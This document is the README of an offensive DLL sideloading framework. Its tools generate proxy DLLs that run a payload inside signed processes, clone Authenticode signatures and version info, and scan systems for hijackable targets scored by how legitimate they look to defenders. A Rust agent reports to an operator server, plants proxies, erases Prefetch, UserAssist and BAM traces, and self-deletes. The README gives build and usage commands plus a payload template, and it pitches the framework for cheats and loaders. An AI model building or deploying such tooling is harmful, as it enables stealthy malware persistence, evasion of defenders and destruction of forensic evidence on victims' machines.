# DLL Proxy Framework

## Why DLL Sideloading?

DLL sideloading lets your code — whether it's a game cheat, loader, or custom tool — execute inside a legitimate, signed process. To anyone looking at the running `.exe`, it's a trusted vendor binary with a valid signature. Your payload is just along for the ride as a DLL it was going to load anyway.

This framework automates the tedious part: analyzing the target DLL's exports, generating the proxy code that forwards every function call to the original, and giving you a clean slot for your payload. Pick a [hijackable DLL](https://hijacklibs.net), run one command, drop in your code, build.

---

## Architecture

The framework has three layers that can be used independently or together:

```
generate.py          Proxy DLL generator (core engine)
scan.py              Target scanner — finds sideloadable EXE+DLL pairs on a system
server/ + agent/     Deployment system — automates the full scan-build-deploy pipeline
```

### Deployment System

The deployment system automates everything end-to-end. A Rust scanner runs on the target machine, reports sideloading opportunities to a backend server, an operator picks a target from the web dashboard, and the system handles the rest — upload, proxy build, deploy, and cleanup.

```
Target Machine                Backend Server              Dashboard
+--------------+             +------------------+        +----------+
| agent.exe    |  --JSON-->  | FastAPI           |  <---  | Web UI   |
| (1.8 MB Rust)|             |                  |        |          |
|              |             | generate.py +     |        | Browse   |
| - PE scanner |  <--DLL---  | MSVC/GCC compile |        | targets, |
| - deployer   |             |                  |        | select   |
| - cleanup    |             | auto-build proxy |        |          |
+--------------+             +------------------+        +----------+
```

**Flow:**

1. Run `agent.exe` on target — scans installed software, finds sideloading targets
2. Agent checks in with the backend, reports all targets
3. Operator picks a target from the web dashboard (e.g. `Discord.exe + dbghelp.dll`)
4. Agent uploads the original DLL to the backend
5. Backend auto-builds a proxy DLL (generate.py + compiler)
6. Agent downloads and deploys the proxy (replace or search-order plant)
7. Agent erases all traces and self-deletes from disk
8. Next time the legitimate EXE starts, the proxy loads — exports work normally, payload fires

The agent can be stopped and restarted between steps. Tasks persist on the server — the agent picks up where it left off on the next check-in.

## Quick Start

### Manual mode (single DLL)

```
pip install -r requirements.txt
python generate.py C:\Windows\System32\version.dll --payload --embed --block
cd output\version_proxy
# edit payload.c
mingw32-make       # or build_msvc.bat
```

### Deployment system

```bash
# 1. Start the backend
cd server
pip install -r requirements.txt
python app.py                          # runs on :8443

# 2. Build and run the scanner on the target
cd agent
cargo build --release
# copy target/release/agent.exe to target machine, run it

# 3. Open http://localhost:8443 — pick a target, click Select
# Everything else is automatic.
```

## Features

- **Export mirroring** — Analyzes PE export table and generates assembly trampolines (`jmp [ptr]`) that transparently forward all calls to the original DLL. Handles named exports, ordinal-only exports, forwarded exports, and C++ mangled names.
- **Embed mode** (`--embed`) — Bakes the original DLL as a PE resource. At load time it extracts to `%TEMP%` and loads it. Single-file deployment.
- **Payload thread** (`--payload`) — Generates a `payload.c` template. Your code runs in a separate thread after all exports are resolved.
- **Block mode** (`--block`) — Suspends the main thread so the process can't exit before your payload finishes. Two-layer approach: primary suspend + atexit fallback. Deadlock-free.
- **MetaTwin cloning** — Clones PE version info and Authenticode signature from the source DLL. The proxy looks identical in file properties.
- **Dual compiler support** — MSVC (`.asm` + `build_msvc.bat`) and MinGW (`.S` + `Makefile`).
- **Both architectures** — x86 and x64, auto-detected from the input DLL.
- **Automated scanning** — Rust-based scanner finds sideloading targets by parsing PE import tables across the entire filesystem.
- **Deployment server** — FastAPI backend with web dashboard. Auto-builds proxy DLLs from uploaded originals.
- **Post-deploy cleanup** — Agent erases its files, clears execution traces (Prefetch, UserAssist, BAM), and self-deletes from disk using NTFS data stream rename.

## Scanner

The scanner finds sideloading targets on the local system. It walks the filesystem, parses PE import tables, and catalogs every EXE+DLL pair usable for deployment.

**Vectors detected:**

| Vector | Description |
|--------|-------------|
| **Replace** | DLL already beside the EXE — copy both, swap DLL with proxy |
| **Search-order** | DLL in System32 but not in app dir — place proxy in app dir, it loads first |
| **Phantom** | DLL imported (delayed) but missing — any DLL with that name gets loaded |

**Scoring** prioritizes legitimacy (how normal it looks to a defender):

| Factor | Score |
|--------|-------|
| Host EXE is signed | +4 |
| Replace vector (proven — app already loads from here) | +3 |
| Search-order vector | +2 |
| Stealth DLL name (version.dll, dbghelp.dll, etc.) | +2 |
| Zero companion DLLs (clean 2-file package) | +2 |
| Delayed import (safer, loads on demand) | +1 |

**Filters out:** KnownDLLs (registry), API sets (`api-ms-*`), `ntdll.dll` (kernel-loaded), phantom static imports (EXE can't start without them).

### Standalone usage

```
python scan.py                                    # scan all drives
python scan.py C:\Users --signed-only --top 20    # signed EXEs, top 20
python scan.py --max-companions 0                 # only clean 2-file packages
python scan.py --vector replace                   # only replace-vector targets
python scan.py -o targets.json                    # save for package.py
```

### Scanner options

```
positional:
  paths                          Directories to scan (default: all drives)

options:
  -t, --threads N                Worker threads (default: 8)
  --signed-only                  Only report signed host EXEs
  --skip-windows                 Skip C:\Windows tree (faster)
  --min-score N                  Minimum score threshold
  --vector {replace,search_order,phantom}  Filter by vector type
  --max-companions N             Max companion DLLs (0 = clean packages only)
  --top N                        Show top N results
  -o, --output FILE              Save JSON for package.py
  --json                         JSON to stdout
  -q, --quiet                    No progress output
```

## Proxy Generator

### Usage

```
python generate.py <dll_path> [options]

Options:
  -o, --output DIR             Output directory (default: ./output/<name>_proxy/)
  --embed                      Embed original DLL as a PE resource
  --payload                    Include payload thread template
  --block                      Block process exit until payload finishes (implies --payload)
  --compiler {msvc,gcc,both}   Target compiler (default: both)
  --arch {x86,x64,auto}        Target architecture (default: auto-detect)
  --original-name NAME         Runtime filename for original DLL (non-embed mode)
  -v, --verbose                Show all exports and generated files
  --dry-run                    Show what would be generated without writing
```

### Generated project structure

```
version_proxy/
+-- proxy.c              # DllMain, function pointer table, init/cleanup
+-- proxy.h              # Exported function pointer declarations
+-- exports.def          # Module definition file (maps exports to trampolines)
+-- trampolines.asm      # MSVC MASM — one jmp [ptr] per export
+-- trampolines.S        # MinGW GAS — same, AT&T/Intel syntax
+-- payload.c            # Your code goes here
+-- payload.h            # Payload thread declaration
+-- resource.rc          # Version info + embedded DLL resource
+-- resource.h           # Resource IDs
+-- original_version.dll # Copy of original DLL
+-- sigclone.py          # Post-build signature cloner (auto-run)
+-- build_msvc.bat       # Build with cl.exe + ml64.exe
+-- Makefile             # Build with gcc + as
```

## How It Works

### Export Forwarding

Each export becomes an assembly trampoline that jumps through a function pointer:

```asm
; x64 MASM
proxy_GetFileVersionInfoA PROC
    jmp QWORD PTR [fp_GetFileVersionInfoA]
proxy_GetFileVersionInfoA ENDP
```

The `.def` file maps the original export name to the trampoline label:
```def
GetFileVersionInfoA = proxy_GetFileVersionInfoA @1
```

At `DLL_PROCESS_ATTACH`, the original DLL is loaded and all function pointers are resolved via `GetProcAddress`. Calls flow through transparently — no register clobbering, no calling convention issues.

### Block Mode

When the host process would exit immediately, `--block` keeps it alive:

1. **Primary**: The payload thread suspends the main thread (after loader lock releases). Payload runs, then calls `ExitProcess(0)`.
2. **Fallback**: If main exits first, `atexit` handler blocks until the payload signals completion.

Both paths are deadlock-free — no loader lock involvement.

### MetaTwin (Metadata + Signature Cloning)

The framework automatically clones the source DLL's identity onto the proxy:

1. **Version info** — CompanyName, FileDescription, FileVersion, etc. are compiled into `resource.rc`. The proxy's file properties look identical.
2. **Authenticode signature** — `sigclone.py` copies the signature. Shows the original signer but reports `HashMismatch` under full validation.

Both are automatic — no flags needed.

```
Original:  Valid    | CN=Microsoft Windows, O=Microsoft Corporation
Proxy:     HashMismatch | CN=Microsoft Windows, O=Microsoft Corporation
```

### Agent Cleanup

After deploying the proxy DLL, the agent erases its traces:

| What | How | Privileges |
|------|-----|-----------|
| Client ID file | Overwrite with zeros, delete | User |
| Temp scanner artifacts | Delete `.~scan*`, `proxy_fw/` | User |
| `.bak` backup of replaced DLL | Delete (proxy embeds original) | User |
| Prefetch entries | Delete `C:\Windows\Prefetch\<exe>-*.pf` | Admin |
| UserAssist history | Remove ROT13-encoded entry from HKCU | User |
| BAM/DAM entries | Remove from `HKLM\..\bam\State\` | Admin |
| Agent binary | NTFS data stream rename + FileDispositionInfoEx | User |

The self-delete uses the NTFS data stream technique: renames `:$DATA` to an alternate stream, then marks the file for deletion via `FileDispositionInfoEx` with POSIX semantics. The binary disappears from disk while the process is still running. Falls back to `cmd.exe` delayed delete on older Windows.

## Deployment Server

### API Endpoints

**Client API** (called by agent):
```
POST /api/checkin          Check-in with scan results, receive pending tasks
POST /api/upload           Upload original DLL for proxy build
GET  /api/download/{id}    Download compiled proxy DLL
POST /api/deployed         Confirm successful deployment
```

**Dashboard API** (called by web UI):
```
GET  /api/clients          List connected clients
GET  /api/clients/{id}     Client detail + targets + builds
POST /api/select           Select target — queues upload task for client
```

**Web UI**: `GET /` serves the operator dashboard at `http://localhost:8443`.

### Agent Configuration

Edit constants at the top of `agent/src/main.rs`:

```rust
const SERVER_URL: &str = "http://127.0.0.1:8443";
const CHECKIN_INTERVAL: Duration = Duration::from_secs(30);
const SCAN_PATHS: &[&str] = &["C:\\"];
```

## Testing

### Unit tests

```
cd test
run_tests.bat
```

10 test cases covering MSVC + GCC, embed/non-embed, block/non-block, and MetaTwin.

### End-to-end smoketest

The `test/smoketest/` directory contains a minimal victim setup (`victim.exe` + `helper.dll`) for verifying the full deployment pipeline. Verified 7/7:

| Check | Result |
|-------|--------|
| Build status = deployed | PASS |
| DLL replaced (42K -> 130K, different hash) | PASS |
| Export forwarding (helper_greet=42, helper_add=17) | PASS |
| Payload execution (proof.txt created) | PASS |
| Agent binary self-deleted from disk | PASS |
| Client ID file cleaned | PASS |
| Backup file removed | PASS |

## Example: Linking a Rust Cheat

If you have a Rust project (cheat, loader, etc.), you can statically link it into the proxy DLL.

### 1. Compile as static library

```toml
[lib]
crate-type = ["staticlib"]
```

```rust
#[unsafe(no_mangle)]
pub extern "C" fn cheat_main() {
    // runs in its own thread inside the hijacked process
}
```

### 2. Generate proxy + edit payload

```
python generate.py C:\Windows\System32\version.dll --payload --embed --block
```

```c
// payload.c
#include "payload.h"
extern void cheat_main(void);
DWORD WINAPI payload_main(LPVOID lpParam) {
    (void)lpParam;
    cheat_main();
    return 0;
}
```

### 3. Link and build

Add the `.lib` to the link line in `build_msvc.bat` or `Makefile`, plus Rust stdlib dependencies (`ws2_32`, `advapi32`, `userenv`, `bcrypt`, etc.).

### Result

```
target_app/
+-- legit_signed_app.exe     # Trusted vendor binary
+-- version.dll              # Proxy (embedded original + your Rust code)
```

One file. The `.exe` in the logs is a signed vendor binary.

## Project Structure

```
DLLProxyFramework/
+-- generate.py              # Proxy DLL generator (CLI)
+-- scan.py                  # Standalone target scanner (CLI)
+-- package.py               # Offline package builder (CLI)
+-- requirements.txt         # Python dependencies
+-- analyzer/                # PE analysis module
|   +-- pe_analyzer.py       # Export table, version info, signature detection
+-- generator/               # Code generation module
|   +-- codegen.py           # Template orchestrator
|   +-- template_engine.py   # Jinja2 wrapper
|   +-- templates/           # 13 Jinja2 templates (C, ASM, BAT, Makefile, RC)
+-- embedder/                # DLL resource embedding
+-- sigclone/                # Authenticode signature cloner
+-- scanner/                 # Python scanner module (used by scan.py)
|   +-- dll_scanner.py       # PE scanning, scoring, target catalog
+-- server/                  # Deployment backend
|   +-- app.py               # FastAPI application
|   +-- models.py            # Data store (agents, targets, builds, tasks)
|   +-- builder.py           # Auto-build pipeline (generate + compile)
|   +-- static/index.html    # Operator web dashboard
+-- agent/                   # Rust scanner + deployer
|   +-- src/main.rs          # Check-in loop, upload, deploy
|   +-- src/scanner.rs       # PE scanning (pelite), scoring
|   +-- src/cleanup.rs       # Trace removal, NTFS self-delete
+-- test/
    +-- run_tests.bat        # 10-case test suite
    +-- smoketest/            # E2E smoketest (victim.exe + helper.dll)
```

## License

MIT
